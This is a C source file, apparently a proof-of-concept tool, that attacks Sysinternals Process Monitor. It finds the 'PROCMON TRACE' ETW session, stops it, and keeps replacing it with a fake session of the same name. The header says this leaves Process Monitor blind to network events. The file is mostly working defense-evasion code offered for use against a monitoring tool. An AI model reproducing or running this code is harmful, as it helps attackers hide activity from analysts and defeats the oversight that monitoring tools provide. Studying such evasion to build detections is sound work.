/*

ORCA : 8/21/2022

Process Monitor version 3.85 uses a session called 'PROCMON TRACE'
This attack will disable 'PROCMON TRACE' etw session and start a new
fake one, leading to Process Monitor not getting any event back, this is
working with the network events, but not on any other events (idk why) ...


*/

#include <Windows.h>
#include <stdio.h>
#include <conio.h>
#include <strsafe.h>
#include <wmistr.h>
#include <shellapi.h>
#include <tchar.h>
#include <evntrace.h>


#define MAXIMUM_LOGGERS 64
#define MAXSTR 1024
#define	PROCMON_ETW_SESSION L"PROCMON TRACE"
#define DEFAULT_LOGFILE_NAME _T("C:\\LogFile.Etl")

// {75955553-2055-11ED-A64B-782B462015F6}
static const GUID  ProcMonGuid = { 0x75955553, 0x2055, 0x11ED, { 0xA6, 0x4B, 0x78, 0x2B, 0x46, 0x20, 0x15, 0xF6 } };

PEVENT_TRACE_PROPERTIES GlobalLoggerInfo;


TRACEHANDLE CreateEtwSession() {

	LPTSTR LoggerName;
	LPTSTR LogFileName;
	ULONG Status = ERROR_SUCCESS;
	TRACEHANDLE LoggerHandle = 0;
	ULONG SizeNeeded = sizeof(EVENT_TRACE_PROPERTIES) +
		2 * MAXSTR * sizeof(TCHAR);


	EVENT_TRACE_PROPERTIES* LoggerInfo = (PEVENT_TRACE_PROPERTIES)malloc(SizeNeeded);
	if (LoggerInfo == NULL) {
		return (ERROR_OUTOFMEMORY);
	}
	RtlZeroMemory(LoggerInfo, SizeNeeded);

	LoggerInfo->Wnode.BufferSize = SizeNeeded;
	LoggerInfo->Wnode.Guid = ProcMonGuid;
	LoggerInfo->Wnode.ClientContext = 1;
	LoggerInfo->Wnode.Flags = EVENT_TRACE_FLAG_IMAGE_LOAD;
	LoggerInfo->LogFileMode = EVENT_TRACE_FILE_MODE_SEQUENTIAL;

	LoggerInfo->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
	LoggerInfo->LogFileNameOffset = LoggerInfo->LoggerNameOffset + MAXSTR * sizeof(TCHAR);

	LoggerInfo->MaximumBuffers = 54;


	LoggerName = (LPTSTR)((PCHAR)LoggerInfo + LoggerInfo->LoggerNameOffset);
	LogFileName = (LPTSTR)((PCHAR)LoggerInfo + LoggerInfo->LogFileNameOffset);

	_tcscpy_s(LogFileName, MAXSTR, DEFAULT_LOGFILE_NAME);
	_tcscpy_s(LoggerName, MAXSTR, PROCMON_ETW_SESSION);


	Status = StartTrace(&LoggerHandle, LoggerName, LoggerInfo);

	if (Status != ERROR_SUCCESS) {
		_tprintf(
			_T("[!] Could not start logger: %s\n")
			_T("STATUS Returned :   %uL\n"),
			LoggerName,
			Status);

		return NULL;
	}

	/*
	_tprintf(_T("Logger Started...\n"));
	*/

	free(LoggerInfo);
	return LoggerHandle;
}


VOID StopEtwSession(PEVENT_TRACE_PROPERTIES LoggerInfo) {
	TRACEHANDLE TraceHandle;
	ULONG STATUS; 
	
	STATUS = StopTraceW((TRACEHANDLE)0, PROCMON_ETW_SESSION, LoggerInfo);
	if (STATUS != ERROR_SUCCESS) {
		_tprintf(_T("ERROR: StopTraceW...\n"));
		_tprintf(_T("Operation Status:       %uL\n"), STATUS);
	}
	/*
	else {
		printf("[+] Disabled ETW Session ! \n");
	}
	*/
}




VOID KeepTracking() {

	ULONG SizeForOneProperty = sizeof(EVENT_TRACE_PROPERTIES) + 2 * MAXSTR * sizeof(TCHAR);
	ULONG SizeNeeded = MAXIMUM_LOGGERS * SizeForOneProperty;
	PEVENT_TRACE_PROPERTIES TempStorage;


	while (TRUE) {
		TempStorage = (PEVENT_TRACE_PROPERTIES)malloc(SizeNeeded);
		TempStorage->Wnode.BufferSize = SizeForOneProperty;
		TempStorage->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
		TempStorage->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + MAXSTR * sizeof(TCHAR);

		if (QueryTrace((TRACEHANDLE)0, PROCMON_ETW_SESSION, TempStorage) == ERROR_WMI_INSTANCE_NOT_FOUND) {
			Sleep(2000);
		}
		else{
			StopEtwSession(GlobalLoggerInfo);
			CreateEtwSession();
		}

		free(TempStorage);
	}
}




int main() {

	PEVENT_TRACE_PROPERTIES  LoggerInfo[MAXIMUM_LOGGERS];
	PEVENT_TRACE_PROPERTIES Storage;
	PEVENT_TRACE_PROPERTIES TempStorage;
	ULONG SizeForOneProperty = sizeof(EVENT_TRACE_PROPERTIES) + 2 * MAXSTR * sizeof(TCHAR);
	ULONG SizeNeeded = MAXIMUM_LOGGERS * SizeForOneProperty;
	ULONG Status = ERROR_SUCCESS;
	ULONG ReturnCount = 0;
	LPTSTR LoggerName;
	BOOL Found = FALSE;


	Storage = (PEVENT_TRACE_PROPERTIES)malloc(SizeNeeded);
	if (Storage == NULL) {
		Status = ERROR_OUTOFMEMORY;
	}

	RtlZeroMemory(Storage, SizeNeeded);
	TempStorage = Storage;



	for (ULONG LoggerCounter = 0; LoggerCounter < MAXIMUM_LOGGERS; LoggerCounter++) {

		Storage->Wnode.BufferSize = SizeForOneProperty;
		Storage->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);

		Storage->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) +
			MAXSTR * sizeof(TCHAR);

		LoggerInfo[LoggerCounter] = Storage;

		Storage = (PEVENT_TRACE_PROPERTIES)((PUCHAR)Storage +
			Storage->Wnode.BufferSize);
	}


	Status = QueryAllTraces(
		LoggerInfo,
		MAXIMUM_LOGGERS,
		&ReturnCount);

	if (Status == ERROR_SUCCESS) {
		for (ULONG LoggerCounter = 0; LoggerCounter < ReturnCount; LoggerCounter++) {

			if ((LoggerInfo[LoggerCounter]->LoggerNameOffset > 0) &&
				(LoggerInfo[LoggerCounter]->LoggerNameOffset < LoggerInfo[LoggerCounter]->Wnode.BufferSize)) {

				LoggerName = (LPTSTR)((PUCHAR)LoggerInfo[LoggerCounter] +
					LoggerInfo[LoggerCounter]->LoggerNameOffset);
			}
			else {
				LoggerName = NULL;
			}


			if (_tcscmp(LoggerName, PROCMON_ETW_SESSION) == 0) {
				Found = TRUE;
				GlobalLoggerInfo = LoggerInfo[LoggerCounter];
				printf("[+] \'PROCMON TRACE\' ETW SESSION IS FOUND, LAUNCHING THE ATTACK ... \n");
				HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeepTracking, NULL, NULL, NULL);
				WaitForSingleObject(hThread, INFINITE);
			}

		}
	}


	free(TempStorage);

	if (!Found) {
		printf("[!] DIDN'T FIND \'PROCMON TRACE\' ETW SESSION ... \n");
	}

	printf("[#] Press <Enter> to Quit ... ");
	getchar();
	return 0;
}
